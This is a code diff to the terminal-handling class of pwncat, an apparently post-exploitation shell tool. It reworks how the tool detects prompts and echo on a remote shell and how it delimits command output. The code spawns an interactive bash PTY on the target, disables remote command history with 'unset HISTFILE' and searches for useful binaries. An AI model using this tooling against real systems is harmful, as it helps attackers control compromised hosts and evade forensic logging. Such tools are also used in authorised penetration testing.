@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from prompt_toolkit import prompt, PromptSession, ANSI
+from prompt_toolkit import PromptSession, ANSI
 from prompt_toolkit.shortcuts import ProgressBar
 import subprocess
 import logging
@@ -30,8 +30,8 @@ class PtyHandler:
     on the local end """
 
     OPEN_METHODS = {
-        "script": "exec {} -qc /bin/bash /dev/null",
-        "python": "exec {} -c \"import pty; pty.spawn('/bin/bash')\"",
+        "script": "exec {} -qc /bin/bash /dev/null 2>&1",
+        "python": "exec {} -c \"import pty; pty.spawn('/bin/bash')\" 2>&1",
     }
 
     INTERESTING_BINARIES = [
@@ -63,7 +63,7 @@ class PtyHandler:
         self.lhost = None
         self.known_binaries = {}
         self.vars = {"lhost": util.get_ip_addr()}
-        self.remote_prompt = b"\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$"
+        self.remote_prompt = "\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$"
         self.prompt = PromptSession(
             [("", "(local) "), ("#ff0000", "pwncat"), ("", "$ ")]
         )
@@ -83,15 +83,58 @@ class PtyHandler:
         # We should always get a response within 3 seconds...
         self.client.settimeout(3)
 
+        util.info("probing for prompt...", overlay=False)
+        start = time.time()
+        prompt = b""
+        try:
+            while time.time() < (start + 0.1):
+                prompt += self.client.recv(1)
+        except socket.timeout:
+            pass
+
+        # We assume if we got data before sending data, there is a prompt
+        if prompt != b"":
+            self.has_prompt = True
+            util.info(f"found a prompt", overlay=True)
+        else:
+            self.has_prompt = False
+            util.info("no prompt observed", overlay=True)
+
+        # Send commands without a new line, and see if the characters are echoed
+        util.info("checking for echoing", overlay=True)
+        self.client.send(b"echo")
+        response = b""
+
+        try:
+            while len(response) < 7:
+                response += self.client.recv(7 - len(response))
+        except socket.timeout:
+            pass
+
+        if response == b"echo":
+            self.has_echo = True
+            util.info("found input echo", overlay=True)
+        else:
+            self.has_echo = False
+            util.info(f"no echo observed", overlay=True)
+
+        self.client.send(b"\n")
+        response = self.client.recv(1)
+        if response == "\r":
+            self.client.recv(1)
+            self.has_cr = True
+        else:
+            self.has_cr = False
+
+        if self.has_echo:
+            self.recvuntil(b"\n")
+
         # Ensure history is disabled
         util.info("disabling remote command history", overlay=True)
-        client.sendall(b"unset HISTFILE\n")
-        self.recvuntil(b"\n")
+        self.run("unset HISTFILE")
 
         util.info("setting terminal prompt", overlay=True)
-        client.sendall(b'export PS1="(remote) %b "\n\n' % self.remote_prompt)
-        self.recvuntil(b"\n")
-        self.recvuntil(b"\n")
+        self.run(f'export PS1="(remote) {self.remote_prompt} "')
 
         # Locate interesting binaries
         # The auto-resolving doesn't work correctly until we have a pty
@@ -104,7 +147,7 @@ class PtyHandler:
             )
 
             # Look for the given binary
-            response = self.run(f"which {shlex.quote(name)}", has_pty=False)
+            response = self.run(f"which {shlex.quote(name)}").strip()
             if response == b"":
                 continue
 
@@ -125,12 +168,16 @@ class PtyHandler:
         util.info(
             f"opening pseudoterminal via {Fore.GREEN}{method}{Fore.RESET}", overlay=True
         )
-        client.sendall(method_cmd.encode("utf-8") + b"\n")
+        self.run(method_cmd, wait=False)
+        # client.sendall(method_cmd.encode("utf-8") + b"\n")
+
+        # We just started a PTY, so we now have all three
+        self.has_echo = True
+        self.has_cr = True
+        self.has_prompt = True
 
         util.info("setting terminal prompt", overlay=True)
-        client.sendall(b'export PS1="(remote) %b "\r' % self.remote_prompt)
-        self.recvuntil(b"\r\n")
-        self.recvuntil(b"\r\n")
+        self.run(f'export PS1="(remote) {self.remote_prompt} "')
 
         # Make sure HISTFILE is unset in this PTY (it resets when a pty is
         # opened)
@@ -459,50 +506,32 @@ class PtyHandler:
 
         EOL = b"\r" if has_pty else b"\n"
 
-        # Read until there's no more data in the queue
-        # This works by waiting for our known prompt
-        self.recvuntil(b"(remote) ")
-        try:
-            # Read to the end of the prompt
-            self.recvuntil(b"$ ", socket.MSG_DONTWAIT)
-        except BlockingIOError:
-            # The prompt may be "#"
-            try:
-                self.recvuntil(b"# ", socket.MSG_DONTWAIT)
-            except BlockingIOError:
-                pass
+        if wait:
+            command = f"echo _PWNCAT_DELIM_; {cmd}; echo _PWNCAT_DELIM_"
+        else:
+            command = cmd
+
+        response = b""
 
         # Send the command to the remote host
-        self.client.send(cmd.encode("utf-8") + EOL)
+        self.client.send(command.encode("utf-8") + b"\n")
 
-        # Initialize response buffer
-        response = b""
-        peek_len = 4096
-
-        # Look for the next prompt in the output and leave it in the buffer
         if wait:
-            while True:
-                data = self.client.recv(peek_len, socket.MSG_PEEK)
-                if b"(remote) " in data:
-                    response = data.split(b"(remote) ")[0]
-                    self.client.recv(len(response))
-                    break
-                if len(data) == peek_len:
-                    peek_len += 4096
+            if self.has_echo:
+                self.recvuntil(b"_PWNCAT_DELIM_")  # first in command
+                self.recvuntil(b"_PWNCAT_DELIM_")  # second in command
+                # Recieve line ending from output
+                self.recvuntil(b"\n")
 
-            # The echoed input command is currently in the output
-            if has_pty:
-                response = b"".join(response.split(b"\r\n")[1:])
+            self.recvuntil(b"_PWNCAT_DELIM_")  # first in output
+            self.recvuntil(b"\n")
+            response = self.recvuntil(b"_PWNCAT_DELIM_")
+            response = response.split(b"_PWNCAT_DELIM_")[0]
+
+            if self.has_cr:
+                self.recvuntil(b"\r\n")
             else:
-                response = b"".join(response.split(b"\n")[1:])
-
-            # Bash sends these escape sequences for some reason, and it fucks up
-            # the output
-            while b"\x1b_" in response:
-                response = response.split(b"\x1b_")
-                before = response[0]
-                after = b"\x1b_".join(response[1:])
-                response = before + b"\x1b\\".join(after.split(b"\x1b\\")[1])
+                self.recvuntil(b"\n")
 
         return response
 
@@ -512,7 +541,6 @@ class PtyHandler:
         result = b""
         while not result.endswith(needle):
             result += self.client.recv(1, flags)
-            # print(result)
 
         return result
 
